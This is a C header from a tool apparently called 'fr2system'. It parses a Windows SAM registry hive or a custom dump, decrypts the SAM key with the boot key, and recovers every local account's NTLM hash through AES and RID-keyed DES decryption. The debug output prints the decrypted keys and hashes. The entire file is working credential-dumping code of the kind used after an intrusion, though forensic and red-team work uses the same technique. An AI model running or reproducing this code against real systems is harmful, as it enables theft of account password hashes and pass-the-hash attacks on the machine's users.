#pragma once
// fr2system - SAM Hive Parser
// Parses SAM hive → extracts encrypted NTLM hashes → decrypts them
// Uses custom hive parser + CryptoAPI

#include "common.h"
#include "hivparse.h"
#include "crypto.h"
#include "bootkey.h"

// SAM "V" value offsets
#define SAM_V_USERNAME_OFFSET        0x0C
#define SAM_V_USERNAME_LEN_OFFSET    0x10
#define SAM_V_LM_HASH_OFFSET        0x9C
#define SAM_V_LM_HASH_LEN_OFFSET    0xA0
#define SAM_V_NT_HASH_OFFSET        0xA8
#define SAM_V_NT_HASH_LEN_OFFSET    0xAC
#define SAM_V_DATA_OFFSET           0xCC

// ── Decrypt SAM "F" value → password encryption key ──
static BYTE* FR2S_DecryptSAMKey(BYTE* fValue, DWORD fValueLen, BYTE bootKey[16], int* outKeyLen) {
    if (fValueLen < 0x78) return NULL;

    int encType = fValue[0x68];
    if (encType != 2) {
        FR2S_Err("Unsupported SAM encryption type: %d (expected AES/type 2)", encType);
        return NULL;
    }

    int endOfs = *(int*)&fValue[0x6C] + 0x68;
    int dataLen = endOfs - 0x70;
    if (dataLen <= 0 || 0x70 + dataLen > (int)fValueLen) return NULL;

    BYTE* data = &fValue[0x70];

    // Parse AES structure: hashLen(4) + encLen(4) + iv(16) + ciphertext + hash
    int hashLen = *(int*)&data[0];
    int encLen = *(int*)&data[4];
    if (encLen <= 0 || 0x18 + encLen + hashLen > dataLen) return NULL;

    BYTE iv[16];
    memcpy(iv, &data[8], 16);

    BYTE* ciphertext = &data[0x18];
    BYTE* hashData = &data[0x18 + encLen];

    // Decrypt the password encryption key
    DWORD pekLen = 0;
    BYTE* pek = FR2S_AES128_CBC_Decrypt(bootKey, iv, ciphertext, encLen, &pekLen);
    if (!pek) return NULL;

    // Decrypt and verify the hash
    DWORD verifyLen = 0;
    BYTE* verifyHash = FR2S_AES128_CBC_Decrypt(bootKey, iv, hashData, hashLen, &verifyLen);

    // Compute SHA-256 of decrypted PEK and compare
    BYTE computedHash[32];
    FR2S_SHA256(pek, pekLen, computedHash);

    if (!verifyHash || memcmp(computedHash, verifyHash, 32) != 0) {
        FR2S_Warn("SAM key verification failed — boot key may be wrong");
        // Continue anyway, might still work
    }

    free(verifyHash);

    // Debug: dump PEK
    printf("     [dbg] PEK (%d bytes): ", pekLen);
    for (DWORD di = 0; di < pekLen && di < 48; di++) printf("%02x", pek[di]);
    printf("\n");

    if (outKeyLen) *outKeyLen = pekLen;  // use ACTUAL pek size, not hardcoded 32
    return pek;
}

// ── Decrypt an individual password hash (AES-encrypted) ──
static BYTE* FR2S_DecryptPasswordHashAES(BYTE* samKey, int samKeyLen, BYTE* data, int dataLen, int* outLen) {
    if (dataLen < 24) return NULL;
    int length = *(int*)&data[4];
    if (length == 0) return NULL;

    BYTE iv[16];
    memcpy(iv, &data[8], 16);

    int cipherLen = dataLen - 24;
    if (cipherLen <= 0) return NULL;

    BYTE* ciphertext = &data[24];
    BYTE* result = FR2S_AES128_CBC_Decrypt(samKey, iv, ciphertext, cipherLen, (DWORD*)outLen);

    // Debug: dump everything
    if (result && *outLen > 0) {
        printf("     [dbg] hash encType=%d length=%d dataLen=%d cipherLen=%d aesOutLen=%d\n",
            *(USHORT*)&data[2], length, dataLen, cipherLen, *outLen);
        printf("     [dbg] AES decrypted (%d bytes): ", *outLen);
        for (int i = 0; i < *outLen && i < 48; i++) printf("%02x", result[i]);
        printf("\n");
    }
    return result;
}

// ── Decrypt password hash (dispatch by encryption type) ──
static BYTE* FR2S_DecryptPasswordHash(BYTE* samKey, int samKeyLen, BYTE* data, int dataLen, ULONG rid, int* outLen) {
    if (dataLen < 4) return NULL;
    int encType = *(USHORT*)&data[2];

    if (encType == 2) {
        return FR2S_DecryptPasswordHashAES(samKey, samKeyLen, data, dataLen, outLen);
    }

    FR2S_Err("Unsupported hash encryption type: %d", encType);
    return NULL;
}

// ── Full NTLM hash decryption: AES layer → DES layer (RID-keyed) ──
static BOOL FR2S_DecryptNTHash(BYTE* samKey, int samKeyLen, BYTE* encHash, int encHashLen, ULONG rid, BYTE outHash[16]) {
    int decLen = 0;
    BYTE* decrypted = FR2S_DecryptPasswordHash(samKey, samKeyLen, encHash, encHashLen, rid, &decLen);
    if (!decrypted || decLen < 16) {
        free(decrypted);
        return FALSE;
    }

    BOOL ret = FR2S_DecryptNTLMWithRID(decrypted, decLen, rid, outHash);
    free(decrypted);
    return ret;
}

// ── Enumeration context ──
typedef struct _SAM_ENUM_CTX {
    HIVE_CTX*       hive;
    BYTE*           samKey;
    int             samKeyLen;
    FR2S_CREDENTIAL creds[FR2S_MAX_USERS];
    int             count;
} SAM_ENUM_CTX;

// ── Subkey enumeration callback ──
static BOOL FR2S_SAMEnumCallback(HIVE_CTX* hive, CM_KEY_NODE* subKey, const char* name, void* context) {
    SAM_ENUM_CTX* ctx = (SAM_ENUM_CTX*)context;

    // Skip "Names" subkey
    if (_stricmp(name, "Names") == 0) return TRUE;
    if (ctx->count >= FR2S_MAX_USERS) return FALSE;

    // Get the "V" value
    DWORD vSize = 0;
    BYTE* vData = FR2S_HiveGetValue(hive, subKey, "V", &vSize);
    if (!vData || vSize < SAM_V_DATA_OFFSET) {
        free(vData);
        return TRUE; // skip but continue
    }

    FR2S_CREDENTIAL* cred = &ctx->creds[ctx->count];
    memset(cred, 0, sizeof(FR2S_CREDENTIAL));

    // Parse RID from subkey name (hex string like "000001F4")
    cred->rid = strtoul(name, NULL, 16);

    // Extract username
    ULONG nameOfs = *(ULONG*)&vData[SAM_V_USERNAME_OFFSET] + SAM_V_DATA_OFFSET;
    ULONG nameLen = *(ULONG*)&vData[SAM_V_USERNAME_LEN_OFFSET];
    if (nameOfs + nameLen <= vSize && nameLen < sizeof(cred->username)) {
        memcpy(cred->username, &vData[nameOfs], nameLen);
    }

    // Extract and decrypt NT hash
    ULONG ntOfs = *(ULONG*)&vData[SAM_V_NT_HASH_OFFSET] + SAM_V_DATA_OFFSET;
    ULONG ntLen = *(ULONG*)&vData[SAM_V_NT_HASH_LEN_OFFSET];

    printf("     [dbg] RID=%lu ntOfs=0x%x ntLen=%lu\n", cred->rid, ntOfs, ntLen);
    if (ntLen > 4 && ntOfs + ntLen <= vSize) {
        printf("     [dbg] raw NT data: ");
        for (ULONG di = 0; di < ntLen && di < 40; di++) printf("%02x", vData[ntOfs + di]);
        printf("\n");
        if (FR2S_DecryptNTHash(ctx->samKey, ctx->samKeyLen, &vData[ntOfs], ntLen, cred->rid, cred->ntlmHash)) {
            cred->ntlmHashLen = 16;
        }
    }

    ctx->count++;
    free(vData);
    return TRUE;
}

// ── Parse FR2S dump format (from direct registry extraction) ──
static int FR2S_ParseFR2SDump(const wchar_t* samPath, BYTE bootKey[16], FR2S_CREDENTIAL* outCreds, int maxCreds) {
    DWORD fileSize = 0;
    BYTE* data = FR2S_ReadFileToBuffer(samPath, &fileSize);
    if (!data || fileSize < 12) {
        free(data);
        return 0;
    }

    BYTE* p = data;
    BYTE* end = data + fileSize;

    // Read F value
    DWORD fSize = *(DWORD*)p; p += 4;
    if (p + fSize > end) { free(data); return 0; }
    BYTE* fData = p; p += fSize;

    // Decrypt SAM key from F value
    int samKeyLen = 0;
    BYTE* samKey = FR2S_DecryptSAMKey(fData, fSize, bootKey, &samKeyLen);
    if (!samKey) {
        FR2S_Err("Failed to decrypt SAM encryption key from FR2S dump");
        free(data);
        return 0;
    }
    FR2S_Ok("SAM encryption key decrypted (FR2S dump)");

    // Read user count
    if (p + 4 > end) { free(samKey); free(data); return 0; }
    DWORD userCount = *(DWORD*)p; p += 4;

    int credCount = 0;
    wchar_t currentUser[UNLEN + 1] = { 0 };
    DWORD userLen = UNLEN + 1;
    GetUserNameW(currentUser, &userLen);

    for (DWORD i = 0; i < userCount && credCount < maxCreds; i++) {
        if (p + 8 > end) break;
        DWORD rid = *(DWORD*)p; p += 4;
        DWORD vSize = *(DWORD*)p; p += 4;
        if (p + vSize > end) break;
        BYTE* vData = p; p += vSize;

        if (vSize < SAM_V_DATA_OFFSET) continue;

        FR2S_CREDENTIAL* cred = &outCreds[credCount];
        memset(cred, 0, sizeof(FR2S_CREDENTIAL));
        cred->rid = rid;

        // Extract username
        ULONG nameOfs = *(ULONG*)&vData[SAM_V_USERNAME_OFFSET] + SAM_V_DATA_OFFSET;
        ULONG nameLen = *(ULONG*)&vData[SAM_V_USERNAME_LEN_OFFSET];
        if (nameOfs + nameLen <= vSize && nameLen < sizeof(cred->username))
            memcpy(cred->username, &vData[nameOfs], nameLen);

        // Extract and decrypt NT hash
        ULONG ntOfs = *(ULONG*)&vData[SAM_V_NT_HASH_OFFSET] + SAM_V_DATA_OFFSET;
        ULONG ntLen = *(ULONG*)&vData[SAM_V_NT_HASH_LEN_OFFSET];
        if (ntLen > 4 && ntOfs + ntLen <= vSize) {
            if (FR2S_DecryptNTHash(samKey, samKeyLen, &vData[ntOfs], ntLen, rid, cred->ntlmHash))
                cred->ntlmHashLen = 16;
        }

        if (_wcsicmp(cred->username, currentUser) == 0)
            cred->isCurrentUser = TRUE;

        credCount++;
    }

    free(samKey);
    free(data);
    return credCount;
}

// ── Main SAM parsing entry point ──
// Reads SAM hive from file, extracts all user credentials
static int FR2S_ParseSAM(const wchar_t* samPath, BYTE bootKey[16], FR2S_CREDENTIAL* outCreds, int maxCreds) {
    DWORD samSize = 0;
    BYTE* samData = FR2S_ReadFileToBuffer(samPath, &samSize);
    if (!samData) {
        FR2S_Err("Failed to read SAM file: %ws", samPath);
        return 0;
    }

    // Detect FR2S dump format (from direct registry extraction)
    if (samSize >= 8 && memcmp(samData, "FR2S", 4) == 0) {
        FR2S_Log("Detected FR2S dump format (direct registry extraction)");
        free(samData);
        return FR2S_ParseFR2SDump(samPath, bootKey, outCreds, maxCreds);
    }

    HIVE_CTX hive = { 0 };
    if (!FR2S_HiveOpen(samData, samSize, &hive)) {
        free(samData);
        return 0;
    }

    // Navigate to SAM\Domains\Account
    CM_KEY_NODE* accountKey = FR2S_HiveOpenKey(&hive, "SAM\\Domains\\Account");
    if (!accountKey) {
        FR2S_Err("Failed to find SAM\\Domains\\Account key");
        free(samData);
        return 0;
    }

    // Get the "F" value → decrypt SAM key
    DWORD fSize = 0;
    BYTE* fValue = FR2S_HiveGetValue(&hive, accountKey, "F", &fSize);
    if (!fValue) {
        FR2S_Err("Failed to read SAM 'F' value");
        free(samData);
        return 0;
    }

    int samKeyLen = 0;
    BYTE* samKey = FR2S_DecryptSAMKey(fValue, fSize, bootKey, &samKeyLen);
    free(fValue);
    if (!samKey) {
        FR2S_Err("Failed to decrypt SAM encryption key");
        free(samData);
        return 0;
    }
    FR2S_Ok("SAM encryption key decrypted");

    // Navigate to Users subkey
    CM_KEY_NODE* usersKey = FR2S_HiveOpenKey(&hive, "SAM\\Domains\\Account\\Users");
    if (!usersKey) {
        FR2S_Err("Failed to find Users key");
        free(samKey);
        free(samData);
        return 0;
    }

    // Enumerate all user subkeys
    SAM_ENUM_CTX ctx = { 0 };
    ctx.hive = &hive;
    ctx.samKey = samKey;
    ctx.samKeyLen = samKeyLen;

    FR2S_HiveEnumSubKeys(&hive, usersKey, FR2S_SAMEnumCallback, &ctx);

    // Copy results
    int copied = min(ctx.count, maxCreds);
    memcpy(outCreds, ctx.creds, copied * sizeof(FR2S_CREDENTIAL));

    // Mark current user
    wchar_t currentUser[UNLEN + 1] = { 0 };
    DWORD userLen = UNLEN + 1;
    GetUserNameW(currentUser, &userLen);
    for (int i = 0; i < copied; i++) {
        if (_wcsicmp(outCreds[i].username, currentUser) == 0)
            outCreds[i].isCurrentUser = TRUE;
    }

    free(samKey);
    free(samData);
    return copied;
}
